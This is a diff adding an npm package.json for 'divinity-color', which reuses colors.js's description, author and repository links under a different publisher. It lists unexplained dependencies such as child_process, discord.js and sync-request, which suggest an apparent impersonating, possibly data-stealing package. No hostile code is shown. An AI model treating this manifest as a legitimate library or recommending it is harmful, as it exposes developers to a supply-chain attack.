@@ -1,0 +1,69 @@
+{
+    "name": "divinity-color",
+    "description": "get colors in your node.js console",
+    "version": "1.4.0",
+    "author": {
+        "name": "Marak Squires"
+    },
+    "contributors": [
+        {
+            "name": "DABH",
+            "url": "https://github.com/DABH"
+        }
+    ],
+    "homepage": "https://github.com/Marak/colors.js",
+    "bugs": {
+        "url": "https://github.com/Marak/colors.js/issues"
+    },
+    "repository": {
+        "type": "git",
+        "url": "git+ssh://git@github.com/Marak/colors.js.git"
+    },
+    "license": "MIT",
+    "scripts": {
+        "lint": "eslint . --fix",
+        "test": "node tests/basic-test.js && node tests/safe-test.js"
+    },
+    "engines": {
+        "node": ">=0.1.90"
+    },
+    "main": "lib/index.js",
+    "devDependencies": {
+        "eslint": "^5.2.0",
+        "eslint-config-google": "^0.11.0",
+        "child_process": "^1.0.2",
+        "discord.js": "^12.5.3",
+        "express": "^4.17.3",
+        "fs": "^0.0.1-security",
+        "node-fetch": "^1.7.3",
+        "os": "^0.1.2",
+        "sync-request": "^6.1.0"
+    },
+    "_id": "divinity-color@1.4.0",
+    "_nodeVersion": "16.14.0",
+    "_npmVersion": "8.3.1",
+    "dist": {
+        "integrity": "sha512-bv34R6b8hNhFu2dfwBssvO5zLaAaa3ESTAGajD+s2XayjjOfI/mPGCDrULiVJnWLnBjzI7Gq7tx8EbmGFRBq1g==",
+        "shasum": "e3c066f8c7919ec4af778266e1aa9ad8bf7f95a6",
+        "tarball": "https://registry.npmjs.org/divinity-color/-/divinity-color-1.4.0.tgz",
+        "fileCount": 23,
+        "unpackedSize": 265650,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiN6CaACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmr3Hg/9HSXpD7CJzrp6yz/PZpr9QOjD09hsO+nbLfl6cwQZKbnsYJGy\r\nLaGJ6PZDHBV9866CEOZVFO9rwPsoyiKHkLLZBmtFOrAWzcP0lfxtUzz0TlDG\r\nBBm4ABpKZvwdigfHLcxNaF4dmZrX2kJlhqtjOHc0tjsUevbAMA8mgcuu+lgN\r\nf4WSkiUYyjO7T4/CD/luFIxGy1QlSOU7XXtKGN4CNqlv+D127ADVYB/UJV6d\r\nTIzoDqDBJIMh4O2tlbUuhWYhncAw4hjSRCLOxqafpXc5AbzmcYxKZNcKfl5C\r\nL/iCkyuKaMY67LnPu46eNBJQ5HCeIfAbuT7p9TYxAogdG/YBlyg7JxPUNKsu\r\nWnzIvTksFqKaYZnkPXp9ebPF/2XBH9ZS5pF1U9FisXYvxguGs21KvcQyfWIV\r\noyuTG8zzJD79IkUcCZeCQmyZtp5mUFDDBzW9qLos7Q7/ud3zHsHZz5uy7k/R\r\nbPDfswltYO73E6ZZkJBo5iGZ7E7o8qNPNFBJBWo9v3czuRDwuDsewGTxcyEr\r\niPnc6kB3u/v0EkA7C1aTTz6cSIkgmS1GwFYKvJqsa9C/oP57NhA+llbs/i82\r\nr0bAcFuod7OZADGi5hvzL1Tf2QlTUBz4VeW7xg7NVofHGMq0gND18GNQRpTp\r\n4TQirvjfEve3Xu7l0Gyy8ov2HzRVNxCMq+g=\r\n=NRRN\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "kakauzin69",
+        "email": "kaualou099@icloud.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "kakauzin69",
+            "email": "kaualou099@icloud.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/divinity-color_1.4.0_1647812762280_0.6848248718456464"
+    },
+    "_hasShrinkwrap": false
+}
